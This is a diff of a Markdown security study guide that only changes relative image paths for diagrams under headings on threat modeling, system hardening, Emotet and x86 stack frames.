+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-diagram.svg" alt="Diagram: Code Review Checklist" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-sticky.svg" alt="Sticky Note: Code Review Checklist" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-sticky.svg" alt="Sticky Note: Code Review Checklist" width="30%">
 </a>
 
 
@@ -4842,14 +4842,14 @@ void bad6() {
 
 ### PASTA 7-Stage Threat Modeling
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-handwritten.svg" alt="Handwritten: PASTA 7-Stage Threat Modeling" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-handwritten.svg" alt="Handwritten: PASTA 7-Stage Threat Modeling" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-diagram.svg" alt="Diagram: PASTA 7-Stage Threat Modeling" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-diagram.svg" alt="Diagram: PASTA 7-Stage Threat Modeling" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-sticky.svg" alt="Sticky Note: PASTA 7-Stage Threat Modeling" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/pasta-7-stage-threat-modeling-sticky.svg" alt="Sticky Note: PASTA 7-Stage Threat Modeling" width="30%">
 </a>
 
 
@@ -4938,14 +4938,14 @@ afl-tmin -i crash_input -o minimized_input -- ./vuln_fuzz @@
 
 ### Linux: Complete sysctl Hardening
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-handwritten.svg" alt="Handwritten: Linux: Complete sysctl Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-handwritten.svg" alt="Handwritten: Linux: Complete sysctl Hardening" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-diagram.svg" alt="Diagram: Linux: Complete sysctl Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-diagram.svg" alt="Diagram: Linux: Complete sysctl Hardening" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-sticky.svg" alt="Sticky Note: Linux: Complete sysctl Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/linux-complete-sysctl-hardening-sticky.svg" alt="Sticky Note: Linux: Complete sysctl Hardening" width="30%">
 </a>
 
 
@@ -5012,14 +5012,14 @@ kernel.perf_event_max_sample_rate = 1
 
 ### Windows: PowerShell Hardening Script
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-handwritten.svg" alt="Handwritten: Windows: PowerShell Hardening Script" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-handwritten.svg" alt="Handwritten: Windows: PowerShell Hardening Script" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-diagram.svg" alt="Diagram: Windows: PowerShell Hardening Script" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-diagram.svg" alt="Diagram: Windows: PowerShell Hardening Script" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-sticky.svg" alt="Sticky Note: Windows: PowerShell Hardening Script" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/windows-powershell-hardening-script-sticky.svg" alt="Sticky Note: Windows: PowerShell Hardening Script" width="30%">
 </a>
 
 
@@ -5086,14 +5086,14 @@ Write-Host "Hardening completed. Restart recommended."
 
 ### Emotet Technical Breakdown
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-handwritten.svg" alt="Handwritten: Emotet Technical Breakdown" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-handwritten.svg" alt="Handwritten: Emotet Technical Breakdown" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-diagram.svg" alt="Diagram: Emotet Technical Breakdown" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-diagram.svg" alt="Diagram: Emotet Technical Breakdown" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-sticky.svg" alt="Sticky Note: Emotet Technical Breakdown" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/emotet-technical-breakdown-sticky.svg" alt="Sticky Note: Emotet Technical Breakdown" width="30%">
 </a>
 
 
@@ -5135,14 +5135,14 @@ alert http $HOME_NET any -> $EXTERNAL_NET any (
 
 ### Complete Stack Frame for x86 (32-bit)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-handwritten.svg" alt="Handwritten: Complete Stack Frame for x86 (32-bit)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-handwritten.svg" alt="Handwritten: Complete Stack Frame for x86 (32-bit)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-diagram.svg" alt="Diagram: Complete Stack Frame for x86 (32-bit)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-diagram.svg" alt="Diagram: Complete Stack Frame for x86 (32-bit)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-sticky.svg" alt="Sticky Note: Complete Stack Frame for x86 (32-bit)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/complete-stack-frame-for-x86-32-bit-sticky.svg" alt="Sticky Note: Complete Stack Frame for x86 (32-bit)" width="30%">
 </a>
 
 
